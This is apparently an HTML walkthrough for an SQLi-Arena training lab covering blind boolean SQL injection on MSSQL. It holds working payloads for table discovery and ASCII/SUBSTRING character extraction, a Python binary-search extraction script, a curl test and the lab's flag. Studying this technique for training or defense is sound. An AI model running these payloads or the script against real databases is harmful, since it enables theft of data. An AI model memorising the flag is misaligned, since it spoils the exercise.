<h4>Step 1: Test Normal Lookup</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Lookup</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>1<br>
        <span class="prompt">SQL: </span>SELECT id FROM employees WHERE id = '1'<br>
        <span class="prompt">Response: </span><strong>Employee found.</strong> (result-success class -- green box)
    </div>
</div>

<h4>Step 2: Confirm Boolean Oracle</h4>
<p>Errors are suppressed, but boolean conditions produce different responses.</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Boolean Oracle</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>1' AND 1=1 -- -<br>
        <span class="prompt">Response: </span><strong>Employee found.</strong> (TRUE -- result-success green box)<br><br>
        <span class="prompt">Input: </span>1' AND 1=2 -- -<br>
        <span class="prompt">Response: </span><strong>Employee not found.</strong> (FALSE -- result-warning yellow box)
    </div>
</div>

<h4>Step 3: Discover the Secrets Table</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Table Discovery</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>1' AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME='secrets')>0 -- -<br>
        <span class="prompt">Response: </span><strong>Employee found.</strong> (TRUE -- secrets table exists!)
    </div>
</div>

<h4>Step 4: Determine Flag Length</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Flag Length</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>1' AND LEN((SELECT TOP 1 secret FROM secrets))>20 -- -<br>
        <span class="prompt">Response: </span><strong>Employee found.</strong> (TRUE -- length > 20)<br><br>
        <span class="prompt">Input: </span>1' AND LEN((SELECT TOP 1 secret FROM secrets))>30 -- -<br>
        <span class="prompt">Response: </span><strong>Employee not found.</strong> (FALSE -- length &lt;= 30)<br><br>
        <span class="prompt">Input: </span>1' AND LEN((SELECT TOP 1 secret FROM secrets))=25 -- -<br>
        <span class="prompt">Response: </span><strong>Employee found.</strong> (TRUE -- flag is exactly <strong>25 characters</strong>)
    </div>
</div>

<h4>Step 5: Extract First Character with ASCII/SUBSTRING</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Character Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>1' AND ASCII(SUBSTRING((SELECT TOP 1 secret FROM secrets),1,1))=70 -- -<br>
        <span class="prompt">Response: </span><strong>Employee found.</strong> (TRUE -- first char is 'F' = ASCII 70)
    </div>
</div>

<h4>Step 6: Binary Search for Speed</h4>
<p>Binary search reduces requests from ~95 to ~7 per character.</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6. Binary Search Example</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// Finding position 2 ('L' = ASCII 76):</span><br>
        <span class="prompt">Input: </span>1' AND ASCII(SUBSTRING((SELECT TOP 1 secret FROM secrets),2,1))>79 -- -<br>
        <span class="prompt">Response: </span><strong>Employee not found.</strong> (FALSE -- char &lt;= 79)<br><br>
        <span class="prompt">Input: </span>1' AND ASCII(SUBSTRING((SELECT TOP 1 secret FROM secrets),2,1))>75 -- -<br>
        <span class="prompt">Response: </span><strong>Employee found.</strong> (TRUE -- char > 75)<br><br>
        <span class="prompt">Input: </span>1' AND ASCII(SUBSTRING((SELECT TOP 1 secret FROM secrets),2,1))>76 -- -<br>
        <span class="prompt">Response: </span><strong>Employee not found.</strong> (FALSE -- char &lt;= 76)<br><br>
        <span class="prompt">// char > 75 AND char &lt;= 76 => char = 76 = 'L'</span>
    </div>
</div>

<h4>Step 7: Automation Script</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 7. Python Automation</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>python3 -c "<br>
import requests<br>
url = 'http://TARGET/lab.php'<br>
flag = ''<br>
for i in range(1, 30):<br>
&nbsp;&nbsp;low, high = 32, 126<br>
&nbsp;&nbsp;while low &lt;= high:<br>
&nbsp;&nbsp;&nbsp;&nbsp;mid = (low + high) // 2<br>
&nbsp;&nbsp;&nbsp;&nbsp;payload = f\"1' AND ASCII(SUBSTRING((SELECT TOP 1 secret FROM secrets),{i},1))>{mid} -- -\"<br>
&nbsp;&nbsp;&nbsp;&nbsp;r = requests.get(url, params={'lab':'mssql/lab4','mode':'black','id':payload})<br>
&nbsp;&nbsp;&nbsp;&nbsp;if 'result-success' in r.text:<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;low = mid + 1<br>
&nbsp;&nbsp;&nbsp;&nbsp;else:<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;high = mid - 1<br>
&nbsp;&nbsp;if low > 126: break<br>
&nbsp;&nbsp;flag += chr(low)<br>
&nbsp;&nbsp;print(f'[+] {flag}')<br>
print(f'Flag: {flag}')<br>
"
    </div>
</div>

<h4>Step 8: Full Extraction Result</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 8. Extracted Flag</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">[+] </span>F -> FL -> FLA -> FLAG -> FLAG{ -> ...<br>
        <span class="prompt">Flag: </span><strong>FLAG{ms_bl1nd_b00l_4sc11}</strong>
    </div>
</div>

<h4>Step 9: Submit the Secret</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{ms_bl1nd_b00l_4sc11}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Manual Test</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab4" \<br> --data-urlencode "id=1' AND ASCII(SUBSTRING((SELECT TOP 1 secret FROM secrets),1,1))=70 -- -"<br><br>
        <span class="prompt"># </span>Verified: Returns "Employee found." (result-success) -- first char is 'F' (ASCII 70)
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> Blind boolean-based SQL injection on MSSQL uses
    <code>SUBSTRING()</code> and <code>ASCII()</code> to extract data one character at a time
    through true/false responses. MSSQL uses <code>LEN()</code> instead of MySQL's
    <code>LENGTH()</code> and <code>SUBSTRING()</code> instead of <code>SUBSTR()</code>.
    Binary search reduces requests from ~95 to ~7 per character. Always use parameterized
    queries and avoid exposing boolean differences in responses.
</div>
